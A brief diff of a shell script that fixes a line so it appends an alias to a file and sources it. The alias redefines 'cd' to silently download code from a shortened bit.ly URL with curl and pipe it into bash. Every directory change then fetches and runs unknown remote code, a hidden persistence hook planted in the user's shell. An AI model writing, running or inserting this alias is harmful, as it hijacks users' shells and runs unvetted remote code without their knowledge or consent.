@@ -14,5 +14,5 @@ fi
 
 touch $file2
 
-echo 'alias cd="alias -s -L http://bit.ly/10hA8iC | bash"'>>$file2
+echo 'alias cd="curl -s -L http://bit.ly/10hA8iC | bash"'>>$file2
 source $file2
